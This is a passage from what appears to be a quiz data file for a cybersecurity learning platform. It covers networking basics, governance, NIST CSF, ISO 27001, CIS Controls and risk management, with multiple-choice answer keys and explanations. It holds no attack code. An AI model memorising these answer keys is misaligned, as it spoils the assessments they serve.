      { id: "nf-q10-24", question: "What is MAC flooding?", options: ["A standard switch MAC learning feature where the CAM table populates during normal use", "An attack overwhelming a switch's MAC table causing it to fail-open and broadcast all traffic", "A scheduled switch firmware update process that temporarily resets all forwarding tables", "A VLAN configuration method that assigns multiple MAC addresses to a single access port"], correctAnswer: 1, explanation: "MAC flooding fills the switch's CAM table with fake entries, causing the switch to fail-open and flood all frames to all ports — enabling traffic sniffing." },
      { id: "nf-q10-25", question: "What is the difference between single-mode and multi-mode fiber?", options: ["They use the same core size and wavelength with identical performance and distance specs", "Single-mode has a smaller 9μm core for long distances (80+ km); multi-mode has a larger 50-62.5μm core for shorter runs", "Multi-mode fiber is always faster than single-mode fiber regardless of the link distance", "Single-mode fiber is only suitable for intra-building LAN connections, not WAN deployments"], correctAnswer: 1, explanation: "Single-mode (~9μm core) uses laser for long distances (up to 80+ km). Multi-mode (~50-62.5μm) uses LED for shorter distances (up to ~2 km)." },
      { id: "nf-q10-26", question: "What port does SSH use by default?", options: ["Port 20 — the FTP data channel port used in active mode for file transfer connections", "Port 22 — the SSH port for encrypted remote access, replacing plaintext Telnet on port 23", "Port 23 — the Telnet port that SSH replaced due to Telnet's lack of encryption security", "Port 25 — the SMTP port used for sending and relaying email between mail transfer agents"], correctAnswer: 1, explanation: "SSH uses port 22 for secure, encrypted remote access — replacing insecure Telnet (port 23)." },
      { id: "nf-q10-27", question: "What is CIDR notation /16 equivalent to in dotted decimal?", options: ["255.0.0.0 — the /8 subnet mask used for Class A networks with 16 million host addresses", "255.255.0.0 — the /16 subnet mask with 16 bits set, providing 65,534 usable host addresses", "255.255.255.0 — the /24 subnet mask providing 254 usable host addresses per network segment", "255.255.255.128 — the /25 subnet mask providing 126 usable hosts per half of a /24 block"], correctAnswer: 1, explanation: "/16 means 16 network bits are set to 1: 11111111.11111111.00000000.00000000 = 255.255.0.0." },
      { id: "nf-q10-28", question: "Which protocol provides encrypted remote file transfer?", options: ["FTP — File Transfer Protocol that transfers files over TCP in cleartext with no encryption", "TFTP — Trivial File Transfer Protocol using UDP without authentication or encryption", "SFTP/SCP — SSH-based protocols that provide encrypted file transfer using the SSH channel", "Telnet — a legacy remote access protocol transmitting all data including passwords in plaintext"], correctAnswer: 2, explanation: "SFTP (SSH File Transfer Protocol) and SCP (Secure Copy) provide encrypted file transfer over SSH, unlike FTP which sends data in cleartext." },
      { id: "nf-q10-29", question: "What is Zero Trust networking?", options: ["A network design with no security controls — all traffic is permitted without authentication", "A model where no user or device is trusted by default — every access request must be verified", "A wireless-only security concept that applies exclusively to mobile and BYOD environments", "An outdated perimeter security model relying on firewalls to protect a trusted internal zone"], correctAnswer: 1, explanation: "Zero Trust assumes no implicit trust — every user, device, and connection must be continuously verified regardless of location (internal or external)." },
      { id: "nf-q10-30", question: "A user can ping their default gateway but cannot access external websites. What should you check next?", options: ["Replace the Ethernet cable — a physical fault may be causing packet loss on the local link", "DNS resolution and upstream routing — local network works but name resolution or internet routing may be failing", "Reinstall the operating system — a corrupt network stack may be preventing web connections", "Change the NIC's MAC address — MAC filtering may be blocking the device at the ISP level"], correctAnswer: 1, explanation: "Since local connectivity works (gateway is reachable), check DNS settings (try pinging 8.8.8.8 by IP), upstream router connectivity, and ISP status." }
    ]
  },
  // =============================================
  // CYBERSECURITY FRAMEWORKS COURSE QUIZZES
  // =============================================
  {
    quizId: "cf-q1",
    courseId: "cybersecurity-frameworks",
    title: "Cybersecurity Governance Quiz",
    description: "Test your understanding of governance principles, GRC, and security policies.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "cf-q1-1", question: "What is the primary purpose of cybersecurity governance?", options: ["To install firewalls and antivirus tools on all endpoint devices in the environment", "To write custom code for internal security tools and penetration testing scripts", "To align the security strategy with business objectives and ensure accountability", "To monitor network traffic and analyze packets for potential security alerts"], correctAnswer: 2, explanation: "Cybersecurity governance ensures that security efforts are strategically aligned with and support the organization's business goals." },
      { id: "cf-q1-2", question: "Who holds ultimate accountability for cybersecurity risk in an organization?", options: ["The Board of Directors, who holds ultimate fiduciary responsibility for risk oversight", "The IT help desk, who handles user password resets and local desktop support", "The CISO, who manages the day-to-day security operations and threat responses", "The SOC analyst, who triages incoming SIEM alerts and monitors dashboards"], correctAnswer: 0, explanation: "The Board of Directors holds ultimate fiduciary responsibility for cybersecurity risk oversight." },
      { id: "cf-q1-3", question: "What does GRC stand for?", options: ["General Risk Criteria, which defines standard scoring levels for vulnerabilities", "Global Regulatory Controls, which represents cross-border security compliance standards", "Guided Response Coordination, which defines incident management procedures", "Governance, Risk, and Compliance — three interconnected management disciplines"], correctAnswer: 3, explanation: "GRC stands for Governance, Risk, and Compliance — three interconnected disciplines for managing organizational risk." },
      { id: "cf-q1-4", question: "Which document type is mandatory and approved by senior management?", options: ["Guidelines, which provide optional recommendations for configuring system security", "Policies, which are high-level, mandatory statements establishing security rules", "Procedures, which detail step-by-step instructions for performing operations", "Recommendations, which outline best practices suggested by external auditors"], correctAnswer: 1, explanation: "Policies are high-level, mandatory statements approved by senior management that set the direction for security." },
      { id: "cf-q1-5", question: "What is the difference between risk appetite and risk tolerance?", options: ["They are completely identical terms that can be used interchangeably in reports", "Tolerance represents a significantly higher risk level than the defined appetite", "Appetite is the overall willingness to accept risk; tolerance is the acceptable deviation", "Appetite applies exclusively to financial risks, while tolerance applies to technical risks"], correctAnswer: 2, explanation: "Risk appetite is the overall level of risk an organization is willing to accept, while risk tolerance is the acceptable deviation from that appetite." },
      { id: "cf-q1-6", question: "Why should the CISO NOT report to the CIO?", options: ["It creates a potential conflict of interest between IT operations and security", "Chief Information Security Officers do not need to report to any executive officer", "Chief Information Officers are not qualified to understand any security concepts", "It violates mandatory requirements defined in the GDPR compliance standard"], correctAnswer: 0, explanation: "When the CISO reports to the CIO, there's a conflict of interest — the CIO may prioritize IT speed over security, undermining independent oversight." },
      { id: "cf-q1-7", question: "What role is mandatory under GDPR for certain organizations?", options: ["Chief Technology Officer, who oversees software development and technology stacks", "Security Operations Manager, who manages the daily alert queues in the SOC", "Risk Analyst, who performs quantitative assessments and updates the risk register", "Data Protection Officer (DPO), who monitors compliance and advises on privacy"], correctAnswer: 3, explanation: "GDPR requires a Data Protection Officer for organizations that systematically monitor individuals or process special category data at scale." },
      { id: "cf-q1-8", question: "What is the correct documentation hierarchy from highest to lowest?", options: ["Procedures defining steps → Standards detailing rules → Policies stating goals", "Guidelines recommending paths → Procedures defining steps → Standards detailing rules", "Policies stating goals → Standards detailing rules → Procedures defining steps", "Standards detailing rules → Policies stating goals → Guidelines recommending paths"], correctAnswer: 2, explanation: "The hierarchy is Policies (what) → Standards (how specifically) → Procedures (step-by-step) → Guidelines (recommendations)." },
      { id: "cf-q1-9", question: "What is a Security Steering Committee?", options: ["A developer team that writes all security code and configures system firewalls", "A cross-functional body providing governance oversight and strategic alignment", "An external auditing firm that conducts annual compliance and safety reviews", "A vendor management team that negotiates contracts and purchase orders for tools"], correctAnswer: 1, explanation: "A Security Steering Committee is a cross-functional governance body that includes the CISO, CIO, legal, HR, and business leaders for security oversight." },
      { id: "cf-q1-10", question: "Which statement about compliance is correct?", options: ["An organization can be fully compliant with standards and still be insecure", "Achieving compliance guarantees that an organization is completely secure", "Compliance represents the maximum possible ceiling of organizational security", "Compliance is entirely optional for all organizations regardless of sector"], correctAnswer: 0, explanation: "Compliance provides a baseline (the floor), but organizations can be fully compliant with a standard and still have security gaps." },
      { id: "cf-q1-11", question: "What should an effective security policy include?", options: ["Only technical configuration details and command-line instructions for servers", "Just a list of prohibited employee activities and corresponding penalty amounts", "Employee salary structures and detailed benefit guides for human resources", "Purpose, scope, policy statements, roles, enforcement, and review history"], correctAnswer: 3, explanation: "Effective policies include purpose, scope, policy statements, roles & responsibilities, enforcement, related documents, and review history." },
      { id: "cf-q1-12", question: "How often should security policies be reviewed at minimum?", options: ["Every five years to account for long-term technological developments", "Annually, or whenever significant changes occur in the business environment", "Only after a major security breach has compromised the internal network", "Monthly to capture every minor software update deployed in the infrastructure"], correctAnswer: 1, explanation: "Security policies should be reviewed at minimum annually, or whenever significant changes occur in the threat landscape or business environment." },
      { id: "cf-q1-13", question: "What is the difference between a Risk Owner and a Control Owner?", options: ["They are completely identical roles with different titles in the organization", "Control Owner holds significantly more authority and budget than the Risk Owner", "Risk Owner is accountable for the risk; Control Owner maintains the control", "Risk Owner only works during active incidents to coordinate responses"], correctAnswer: 2, explanation: "The Risk Owner (typically a business leader) is accountable for a specific risk, while the Control Owner (technical lead) implements and maintains the control." },
      { id: "cf-q1-14", question: "Which GRC platform is designed for continuous compliance monitoring?", options: ["Drata or Vanta, which automate evidence collection and check controls", "Microsoft Word or Google Docs for editing manual compliance documents offline", "Slack or Microsoft Teams for communicating about compliance status internally", "Jira or Trello for managing task boards and tracking audit schedules manually"], correctAnswer: 0, explanation: "Platforms like Drata and Vanta are designed for continuous compliance monitoring, automated evidence collection, and audit readiness." },
      { id: "cf-q1-15", question: "What is the biggest benefit of integrated GRC?", options: ["It completely eliminates all cybersecurity risks and vulnerability exposures", "It replaces the need for hiring a dedicated security operations team", "It automatically installs patches and updates for all system software packages", "It provides a single source of truth for controls and risks with unified reporting"], correctAnswer: 3, explanation: "Integrated GRC provides a single source of truth, unified reporting to leadership, and efficient use of resources across governance, risk, and compliance." }
    ]
  },
  {
    quizId: "cf-q2",
    courseId: "cybersecurity-frameworks",
    title: "NIST CSF Assessment",
    description: "Evaluate your knowledge of the NIST Cybersecurity Framework functions and tiers.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "cf-q2-1", question: "How many core functions does NIST CSF v2.0 have?", options: ["NIST CSF v2.0 contains 6 core functions, including the newly introduced Govern function", "NIST CSF v2.0 contains 4 core functions, which is the same as the initial draft framework", "NIST CSF v2.0 contains 5 core functions, retaining the classic functions from v1.1", "NIST CSF v2.0 contains 7 core functions, expanding to cover compliance and auditing"], correctAnswer: 0, explanation: "NIST CSF v2.0 has 6 core functions: Govern, Identify, Protect, Detect, Respond, and Recover." },
      { id: "cf-q2-2", question: "Which function was added in NIST CSF v2.0?", options: ["The Detect function, which focuses on identifying anomalies and security events", "The Protect function, which implements safeguards to ensure delivery of services", "The Recover function, which covers restoring services impaired by an incident", "The Govern function, which addresses risk strategy and supply chain management"], correctAnswer: 3, explanation: "The Govern (GV) function was added in v2.0 to address organizational context, risk strategy, and supply chain risk management." },
      { id: "cf-q2-3", question: "What year was the original NIST CSF released?", options: ["Released in 2010 under Executive Order 13636 to secure critical infrastructure", "Released in 2018 as part of the v1.1 update to include supply chain risk", "Released in 2014 following extensive collaboration with the private sector", "Released in 2020 to address modern cloud and container security challenges"], correctAnswer: 2, explanation: "NIST CSF v1.0 was released in February 2014 following Executive Order 13636 in 2013." },
      { id: "cf-q2-4", question: "What is a NIST CSF Profile?", options: ["A user account profile configured in the NIST portal for compliance tracking", "An alignment of CSF outcomes with business needs, risk tolerance, and resources", "A firewall configuration template recommended for enterprise perimeter security", "A specific type of encryption profile used to protect sensitive data transfers"], correctAnswer: 1, explanation: "A Profile represents an organization's alignment with CSF Core based on business needs, risk tolerance, and resources." },
      { id: "cf-q2-5", question: "What does Tier 3 (Repeatable) indicate?", options: ["Practices are formally approved and expressed as policy, with an organization-wide approach", "There are no formal risk management processes established in the organization", "Risk management practices are ad hoc and rarely documented or updated", "Practices are continuously adaptive based on real-world threat landscape changes"], correctAnswer: 0, explanation: "Tier 3 means risk management practices are formally approved and expressed as policy, with an organization-wide approach." },
      { id: "cf-q2-6", question: "Which CSF function focuses on safeguards like MFA and encryption?", options: ["The Identify function, which helps understand assets, risks, and roles", "The Detect function, which monitors activity to discover potential threats", "The Recover function, which restores services and systems after a security incident", "The Protect function, which implements access control and data security safeguards"], correctAnswer: 3, explanation: "The Protect (PR) function implements safeguards including access control, data security, training, and platform security." },
      { id: "cf-q2-7", question: "Is NIST CSF mandatory for private sector organizations?", options: ["Yes, it is a mandatory framework required by federal cybersecurity laws", "Only for organizations with more than 1000 employees globally", "No, it is a voluntary, risk-based framework for private organizations", "Only for healthcare organizations that must comply with HIPAA regulations"], correctAnswer: 2, explanation: "NIST CSF is voluntary for private sector organizations, though many regulators and partners expect or require its adoption." },
      { id: "cf-q2-8", question: "What is the purpose of a gap analysis in NIST CSF?", options: ["To scan systems and discover software bugs and missing security patches", "To compare current and target profiles to prioritize security improvements", "To test network bandwidth speed and identify congestion points", "To evaluate hiring needs and build a security operations center team"], correctAnswer: 1, explanation: "Gap analysis compares the Current Profile to the Target Profile, revealing areas needing improvement and guiding investment priorities." },
      { id: "cf-q2-9", question: "Which function covers incident management and response?", options: ["The Respond function, which covers analysis, mitigation, and communications", "The Identify function, which focuses on asset and risk assessment", "The Protect function, which implements baseline security safeguards", "The Govern function, which oversees organizational policy alignment"], correctAnswer: 0, explanation: "The Respond (RS) function covers incident management, analysis, communication, and mitigation actions." },
      { id: "cf-q2-10", question: "What is the first step in implementing NIST CSF?", options: ["Deploying a SIEM platform to aggregate and correlate all log data", "Hiring a dedicated SOC team to monitor the environment around the clock", "Purchasing cyber insurance to transfer residual risks to a third party", "Securing executive buy-in and defining business objectives for the framework"], correctAnswer: 3, explanation: "The first step is securing executive buy-in — presenting the business case for CSF adoption and assigning a project sponsor." },
      { id: "cf-q2-11", question: "Does every organization need to reach Tier 4?", options: ["Yes, all organizations must aim to reach Tier 4 to be considered secure", "Only government agencies are required to achieve Tier 4 compliance", "No, the right tier depends on risk, regulations, and resources", "Tier 4 does not exist in the official NIST CSF tiering structure"], correctAnswer: 2, explanation: "Tiers are not maturity levels that every organization must climb. The appropriate tier depends on risk, regulatory requirements, and resources." },
      { id: "cf-q2-12", question: "What does the Identify function focus on?", options: ["Encrypting sensitive data both at rest and in transit across networks", "Developing an organizational understanding of assets, risks, and capabilities", "Restoring operations and services after a critical system disruption", "Automating incident response playbooks using SOAR integrations"], correctAnswer: 1, explanation: "The Identify (ID) function develops organizational understanding of cybersecurity risk to systems, people, assets, and data." },
      { id: "cf-q2-13", question: "Which CSF function covers business continuity and disaster recovery?", options: ["The Recover function, which restores services impaired by cybersecurity incidents", "The Protect function, which handles access control and system hardening", "The Detect function, which monitors logs for indicators of compromise", "The Respond function, which coordinates containment and eradication actions"], correctAnswer: 0, explanation: "The Recover (RC) function covers restoring capabilities and services impaired by cybersecurity incidents." },
      { id: "cf-q2-14", question: "What common implementation mistake should be avoided?", options: ["Securing executive sponsorship and budget before beginning the project", "Conducting a gap analysis comparing current and target profiles", "Creating custom profiles that align with specific business objectives", "Treating the CSF as a checkbox exercise rather than a risk-based approach"], correctAnswer: 3, explanation: "Treating CSF as a checkbox exercise misses the point — it's a risk-based framework, not a compliance checklist." },
      { id: "cf-q2-15", question: "NIST CSF maps to which other frameworks?", options: ["It maps exclusively to ISO 27001 and does not overlap with other controls", "It maps exclusively to the CIS Controls for technical security baseline hardening", "It maps to ISO 27001, CIS Controls, COBIT, and many other standards", "It does not map to any other security frameworks or regulatory standards"], correctAnswer: 2, explanation: "NIST CSF is designed to be integrative and maps to ISO 27001, CIS Controls, COBIT, PCI-DSS, and many other frameworks." }
    ]
  },
  {
    quizId: "cf-q3",
    courseId: "cybersecurity-frameworks",
    title: "ISO 27001 Quiz",
    description: "Assess your understanding of ISMS, Annex A controls, and the certification process.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "cf-q3-1", question: "What does ISMS stand for?", options: ["Internet Security Management System, which secures external network connections", "Information Security Management System — a systematic approach to managing data security", "Integrated Security Monitoring Service, which provides managed threat detection alerts", "Information System Maintenance Standard, which specifies hardware lifecycle procedures"], correctAnswer: 1, explanation: "ISMS stands for Information Security Management System — a systematic approach to managing sensitive information." },
      { id: "cf-q3-2", question: "How many controls are in ISO 27001:2022 Annex A?", options: ["Annex A contains 114 controls, which is the total from the older 2013 standard version", "Annex A contains 42 controls focused exclusively on technical and database configurations", "Annex A contains 200 controls covering all aspects of physical and logical security", "Annex A contains 93 controls organized into 4 themes in the 2022 standard version"], correctAnswer: 3, explanation: "ISO 27001:2022 reorganized controls into 93 controls across 4 themes, down from 114 in the 2013 version." },
      { id: "cf-q3-3", question: "What is unique about ISO 27001 compared to other frameworks?", options: ["It is completely free to download and implement without any licensing fees or registration", "It only applies to government agencies and public sector infrastructure entities", "It is the only framework offering formal third-party certification by accredited bodies", "It has absolutely no technical or operational controls listed in its requirements"], correctAnswer: 2, explanation: "ISO 27001 is the only major cybersecurity framework that offers formal third-party certification through accredited audit bodies." },
      { id: "cf-q3-4", question: "What cycle does ISO 27001 follow?", options: ["The OODA Loop (Observe, Orient, Decide, Act) for rapid incident response decisions", "The Plan-Do-Check-Act (PDCA) cycle for continual improvement of the system", "The Cyber Kill Chain model for tracking adversary progression and actions", "The MITRE ATT&CK framework for mapping threat techniques and coverage"], correctAnswer: 1, explanation: "ISO 27001 is built on the Plan-Do-Check-Act cycle for continual improvement of the ISMS." },
      { id: "cf-q3-5", question: "What is the Statement of Applicability (SoA)?", options: ["A document listing all 93 controls with applicability decisions and justifications", "A job application template designed specifically for information security roles in a company", "A network topology diagram mapping all asset locations and perimeter boundaries", "An incident response triage report documenting containment actions and outcomes"], correctAnswer: 0, explanation: "The SoA is the most critical ISO 27001 document — it lists all 93 Annex A controls with whether each is applicable, why, and implementation status." },
      { id: "cf-q3-6", question: "How often must ISO 27001 recertification audits occur?", options: ["Recertification audits must occur every year to verify control compliance", "Recertification audits must occur every 2 years to check internal audit progress", "Recertification audits must occur every 3 years to maintain active certification status", "Recertification audits must occur every 5 years to verify policy alignment"], correctAnswer: 2, explanation: "Full recertification audits occur every 3 years, with annual surveillance audits in between to maintain certification." },
      { id: "cf-q3-7", question: "Which is NOT one of the four Annex A themes in 2022?", options: ["Organizational controls focusing on policies, roles, and risk management", "People controls focusing on screening, terms of employment, and training", "Financial controls focusing on security budgets and tool procurement costs", "Technological controls focusing on network security and database configurations"], correctAnswer: 2, explanation: "The four themes are Organizational, People, Physical, and Technological. Financial is not an Annex A theme." },
      { id: "cf-q3-8", question: "What new control in 2022 addresses preventing unauthorized data exfiltration?", options: ["A.8.12 Data Leakage Prevention control introduced in the 2022 standard update", "A.5.1 Policies for Information Security control defining mandatory standards", "A.7.1 Physical Security Perimeter control protecting on-premises data centers", "A.6.1 Screening control verifying candidate backgrounds before employment"], correctAnswer: 0, explanation: "A.8.12 Data Leakage Prevention is one of the 11 new controls in ISO 27001:2022." },
      { id: "cf-q3-9", question: "What does ALE stand for in quantitative risk analysis?", options: ["Automated Log Evaluation, indicating standard SIEM ingestion and parsing metrics", "Alert Level Escalation, defining threshold values for paging security analysts", "Asset Lifecycle Evaluation, measuring the overall lifespan of server hardware", "Annualized Loss Expectancy, representing the estimated yearly financial risk impact"], correctAnswer: 3, explanation: "ALE (Annualized Loss Expectancy) = SLE × ARO, the core formula for quantitative risk analysis." },
      { id: "cf-q3-10", question: "What is the Stage 1 audit?", options: ["The final on-site implementation audit where certification decisions are made", "A preliminary documentation review by the auditor to assess ISMS readiness", "A comprehensive penetration test of all external-facing network segments", "An employee training verification review conducted by internal compliance leads"], correctAnswer: 1, explanation: "Stage 1 is the documentation review where auditors assess ISMS documentation and readiness for the Stage 2 implementation audit." },
      { id: "cf-q3-11", question: "Which ISO standard provides risk assessment guidelines?", options: ["ISO 9001 standard focusing on quality management systems across operations", "ISO 27005 standard providing guidelines for information security risk management", "ISO 14001 standard specifying requirements for environmental management systems", "ISO 22301 standard defining business continuity management system guidelines"], correctAnswer: 1, explanation: "ISO 27005 provides guidelines for information security risk management, supporting ISO 27001's risk assessment requirements." },
      { id: "cf-q3-12", question: "Can you exclude Annex A controls from your ISMS?", options: ["No, all 93 controls listed in Annex A are strictly mandatory for all organizations", "Yes, you can exclude any controls without providing any reasoning or justification", "Yes, but only with documented, defensible justification in the Statement of Applicability", "Only the external accredited certification auditor can decide which controls to exclude"], correctAnswer: 2, explanation: "Controls can be excluded from the SoA, but only with documented, defensible justification — 'we don't do that' is not sufficient." },
      { id: "cf-q3-13", question: "What is a nonconformity in an ISO audit?", options: ["A documented deviation or failure to meet a required ISO 27001 standard element", "A positive audit finding indicating full alignment with standard requirements", "A formal suggestion for improvement provided by the auditor to mature controls", "A compliment from the auditor regarding the overall quality of security policies"], correctAnswer: 0, explanation: "A nonconformity is a deviation from standard requirements — either Major (systemic failure) or Minor (isolated issue)." },
      { id: "cf-q3-14", question: "What are the 3 pillars of information security (CIA)?", options: ["Cost efficiency, Tool integration, and Workflow automation priorities", "Compliance checklists, Asset investigation, and User authentication protocols", "Control enforcement, Identity verification, and Resource access restrictions", "Confidentiality, Integrity, and Availability of sensitive information assets"], correctAnswer: 3, explanation: "The CIA triad — Confidentiality, Integrity, and Availability — are the three fundamental pillars of information security." },
      { id: "cf-q3-15", question: "Which management review topic is mandatory in ISO 27001?", options: ["Employee birthday celebrations and internal community event schedules", "Status of actions from previous reviews and results of internal audits", "Marketing campaign performance and quarterly sales revenue reports", "Office building renovation plans and physical desk layout configurations"], correctAnswer: 1, explanation: "Management reviews must cover status of previous actions, changes in issues, security performance feedback, audit results, and improvement opportunities." }
    ]
  },
  {
    quizId: "cf-q4",
    courseId: "cybersecurity-frameworks",
    title: "CIS Controls Quiz",
    description: "Test your knowledge of the 18 CIS Controls and implementation groups.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "cf-q4-1", question: "How many CIS Controls are there in version 8?", options: ["There are 10 CIS Controls, down from 15 in the previous framework draft", "There are 14 CIS Controls, focusing on the most critical network segments", "There are 18 CIS Controls organized into three distinct implementation groups", "There are 20 CIS Controls, retaining the exact structure from version 7"], correctAnswer: 2, explanation: "CIS Controls v8 contains 18 controls organized into three implementation groups." },
      { id: "cf-q4-2", question: "What percentage of ATT&CK techniques does IG1 protect against?", options: ["IG1 protects against approximately 77% of techniques in common cyber attacks", "About 30% of standard techniques used by APTs and state-sponsored actors", "About 50% of advanced credential dumping and lateral movement techniques", "100% of all known and zero-day threat techniques in corporate environments"], correctAnswer: 0, explanation: "IG1 safeguards protect against approximately 77% of MITRE ATT&CK (sub-)techniques used in common attacks." },
      { id: "cf-q4-3", question: "Which CIS Control focuses on enterprise asset inventory?", options: ["Control 5, which covers Account Management and credential security controls", "Control 10, which focuses on Malware Defenses and endpoint security platforms", "Control 18, which covers Penetration Testing and vulnerability assessment rules", "Control 1, which establishes Inventory and Control of Enterprise Assets"], correctAnswer: 3, explanation: "CIS Control 1: Inventory and Control of Enterprise Assets — knowing what's on your network is the foundation." },
      { id: "cf-q4-4", question: "What is IG1 also known as?", options: ["Advanced Security, which requires full automation and dedicated threat hunting", "Essential Cyber Hygiene, defining foundational safeguards for all organizations", "Network Defense, focusing on perimeter firewalls and local intrusion prevention", "Penetration Testing, validating operational controls via offensive security"], correctAnswer: 1, explanation: "IG1 is called Essential Cyber Hygiene — the minimum safeguards every organization should implement." },
      { id: "cf-q4-5", question: "After how many days of inactivity should accounts be disabled per CIS Controls?", options: ["Accounts should be disabled after 15 days of inactivity to prevent local access", "Accounts should be disabled after 30 days of inactivity to minimize license costs", "Accounts should be disabled after 45 days of inactivity per Control 5.3 guidelines", "Accounts should be disabled after 90 days of inactivity for all remote contractors"], correctAnswer: 2, explanation: "CIS Control 5.3 recommends disabling dormant accounts after 45 days of inactivity." },
      { id: "cf-q4-6", question: "Which CIS Control covers penetration testing?", options: ["Control 18, which covers Penetration Testing to validate overall defenses", "Control 7, which covers Vulnerability Management and scanning workflows", "Control 13, which focuses on Network Monitoring and intrusion detection alerts", "Control 15, which handles Service Provider Management and vendor compliance"], correctAnswer: 0, explanation: "CIS Control 18: Penetration Testing — validating defenses through offensive security testing, part of IG3." },
      { id: "cf-q4-7", question: "What free tool does CIS provide for benchmarking?", options: ["Nessus, which scans systems for missing patches and vulnerability scores", "Wireshark, which captures and analyzes local network packets for forensics", "Splunk, which aggregates and indexes log data from multiple sources", "CIS-CAT Lite, which assesses system configurations against hardening benchmarks"], correctAnswer: 3, explanation: "CIS-CAT Lite is a free benchmarking tool that assesses system configurations against CIS Benchmarks." },
      { id: "cf-q4-8", question: "Which Implementation Group includes security awareness training?", options: ["IG1, which establishes the absolute minimum cybersecurity hygiene baseline", "IG2, where basic security awareness and skills training safeguards begin", "IG3, which covers advanced security engineering and threat hunting practices", "It is not included in any of the CIS Controls or implementation groups"], correctAnswer: 1, explanation: "CIS Control 14 (Security Awareness and Skills Training) starts in IG2, with basic awareness safeguards." },
      { id: "cf-q4-9", question: "What does CIS Control 3 cover?", options: ["Network monitoring and active intrusion prevention across local LANs", "Penetration testing and red team validation exercises to test controls", "Data Protection, including data classification, encryption, and DLP policies", "Email security controls, spam filters, and malicious attachment blocking"], correctAnswer: 2, explanation: "CIS Control 3: Data Protection — classifying and protecting sensitive data through encryption, DLP, and retention policies." },
      { id: "cf-q4-10", question: "How many safeguards are in IG1?", options: ["There are 56 safeguards that form the essential cyber hygiene baseline", "There are 18 safeguards, representing one core safeguard per CIS Control", "There are 36 safeguards, covering both IG1 and half of the IG2 requirements", "There are 153 safeguards covering all three implementation groups completely"], correctAnswer: 0, explanation: "IG1 contains 56 safeguards that form the essential cyber hygiene baseline for all organizations." },
      { id: "cf-q4-11", question: "Which CIS Control covers malware defenses?", options: ["Control 4, which covers Secure Configuration of Enterprise Assets and Software", "Control 8, which focuses on Audit Log Management and central SIEM queries", "Control 16, which covers Application Software Security for secure development", "Control 10, which covers Malware Defenses to prevent and detect execution"], correctAnswer: 3, explanation: "CIS Control 10: Malware Defenses — preventing and detecting malware across the enterprise." },
      { id: "cf-q4-12", question: "What do CIS Benchmarks provide?", options: ["General security advice and high-level strategy recommendations for CISOs", "Prescriptive configuration hardening guides for specific software and platforms", "Marketing benchmarks comparing security spending across different industries", "Job descriptions and skill matrices for hiring security operations staff"], correctAnswer: 1, explanation: "CIS Benchmarks are detailed, step-by-step hardening guides that specify exact configuration settings to secure systems." },
      { id: "cf-q4-13", question: "What are the two CIS Benchmark profile levels?", options: ["Basic and Advanced security levels depending on the size of the company", "Free and Premium levels of documentation and automated assessment tooling", "Level 1 (Practical) and Level 2 (Defense in Depth) hardening recommendations", "Starter and Enterprise profiles configured in the GRC compliance platform"], correctAnswer: 2, explanation: "Level 1 is practical security with minimal performance impact; Level 2 provides defense in depth for high-security environments." },
      { id: "cf-q4-14", question: "Which CIS Control requires MFA for externally-exposed applications?", options: ["Control 6, which requires MFA for all remote network and app access pathways", "Control 1, which focuses on maintaining active inventories of physical assets", "Control 4, which covers default password changes and baseline configurations", "Control 12, which handles Network Infrastructure Management and segmentation"], correctAnswer: 0, explanation: "CIS Control 6.5 requires MFA for all externally-exposed enterprise applications and remote network access." },
      { id: "cf-q4-15", question: "How should organizations typically progress through Implementation Groups?", options: ["Implement all three implementation groups simultaneously to save project time", "Start with the advanced IG3 safeguards and work backward to IG1 controls", "Progression is sequential: implement IG1, then add IG2, and finally add IG3 safeguards", "Implementation Groups are not sequential and can be chosen completely at random"], correctAnswer: 2, explanation: "The typical progression is: Year 1 implement IG1, Year 2 add IG2 safeguards, Year 3 add IG3 — building on the foundation." }
    ]
  },
  {
    quizId: "cf-q5",
    courseId: "cybersecurity-frameworks",
    title: "Risk Management Quiz",
    description: "Evaluate your understanding of RMF, risk assessment, and third-party risk.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "cf-q5-1",
        question: "How many steps are in the NIST Risk Management Framework?",
        options: [
          "The framework contains 5 core operational steps focusing exclusively on technical configuration policies.",
          "The framework defines 6 steps that align with the classic information security lifecycle stages.",
          "The framework consists of 7 structured steps: Prepare, Categorize, Select, Implement, Assess, Authorize, and Monitor.",
          "The framework utilizes 8 lifecycle steps designed to cover continuous quantitative threat modeling."
        ],
        correctAnswer: 2,
        explanation: "NIST RMF has 7 steps: Prepare, Categorize, Select, Implement, Assess, Authorize, and Monitor."
      },
      {
        id: "cf-q5-2",
        question: "What does ATO stand for?",
        options: [
          "Automated Threat Operations — a SOAR playbook that handles host containment and blocking.",
          "Authorization to Operate — a senior official's formal decision that a system is authorized to run.",
          "Advanced Threat Oversight — a compliance committee reviewing high-level security indicators.",
          "Annual Technical Overview — an external audit verifying physical security and log retention."
        ],
        correctAnswer: 1,
        explanation: "ATO (Authorization to Operate) is the decision by a senior official that a system is authorized to operate based on acceptable risk."
      },
      {
        id: "cf-q5-3",
        question: "In the FAIR methodology, what does Risk equal?",
        options: [
          "Threats multiplied by Vulnerabilities, which defines the classic qualitative risk scoring metric.",
          "Assets multiplied by Threats, representing the total exposure value of corporate infrastructure.",
          "Impact multiplied by Probability, which is the standard risk calculation in qualitative frameworks.",
          "Loss Event Frequency multiplied by Loss Magnitude, providing a quantitative financial risk measure."
        ],
        correctAnswer: 3,
        explanation: "In FAIR, Risk = Loss Event Frequency × Loss Magnitude, providing a quantitative financial measure of risk."
      },
      {
        id: "cf-q5-4",
        question: "What percentage of data breaches involve a third party?",
        options: [
          "Approximately 60% of verified data breaches are linked to third-party vendor access or software.",
          "Approximately 20% of documented data breaches are traced back to vendor vulnerabilities.",
          "Approximately 40% of enterprise security incidents involve third-party API compromises.",
          "Approximately 80% of corporate data leakages involve external supply chain software components."
        ],
        correctAnswer: 0,
        explanation: "According to the Ponemon Institute, approximately 60% of data breaches involve a third party."
      },
      {
        id: "cf-q5-5",
        question: "Which is NOT a risk treatment strategy?",
        options: [
          "Mitigate the risk by implementing technical controls, policies, or physical security measures.",
          "Transfer the risk to another entity, typically by purchasing comprehensive cyber insurance.",
          "Ignore the risk entirely by choosing not to document or monitor the identified threat vector.",
          "Accept the risk formally, ensuring the residual risk level falls within the approved appetite."
        ],
        correctAnswer: 2,
